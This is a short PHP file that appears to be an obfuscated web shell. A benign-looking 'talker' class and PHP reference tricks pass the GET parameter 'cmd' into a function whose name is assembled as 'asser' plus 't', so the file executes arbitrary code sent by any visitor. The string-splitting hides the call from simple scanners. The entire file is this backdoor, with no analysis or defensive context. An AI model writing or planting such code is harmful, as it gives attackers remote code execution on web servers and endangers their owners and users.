<?php
class talker{
    public $data = 'Hi';
    public function & get(){
        return $this->data;
    }
}
$aa = new talker();
$d = &$aa->get();
$d = $_GET[cmd];
function foo(&$var)
{
    $var=$var.'t';
}
$a="asser";
foo($a);
$a($aa->data);